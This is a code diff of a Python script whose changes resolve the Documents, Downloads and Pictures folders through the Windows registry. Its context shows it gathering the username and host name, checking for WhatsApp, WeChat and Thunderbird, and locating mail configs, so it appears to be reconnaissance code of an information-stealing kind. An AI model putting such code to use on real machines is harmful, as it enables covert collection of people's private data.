@@ -2,6 +2,7 @@ import os
 import glob
 import json
 import shutil
+import winreg
 import platform
 import subprocess
 import mysql.connector
@@ -23,6 +24,14 @@ def execute_command(command):
         return result.strip()
     except subprocess.CalledProcessError:
         return None
+
+
+def get_special_folder_path(folder_name):
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')
+    folder_path, _ = winreg.QueryValueEx(key, folder_name)
+    winreg.CloseKey(key)
+    return folder_path
 
 
 def is_installed(app_name):
@@ -56,9 +65,9 @@ def find_mail_configs():
 def gather_system_info():
     user = os.environ.get('USERNAME', 'N/A')
     computer_name = platform.node()
-    my_documents = os.path.expanduser('~/Documents')
-    downloads = os.path.expanduser('~/Downloads')
-    pictures = os.path.expanduser('~/Pictures')
+    my_documents = get_special_folder_path('Personal')
+    downloads = get_special_folder_path('{374DE290-123F-4565-9164-39C4925E467B}')
+    pictures = get_special_folder_path('My Pictures')
     whats_app_installed = is_installed('WhatsApp')
     we_chat_installed = is_installed('WeChat')
     thunderbird_installed = is_installed('Thunderbird')
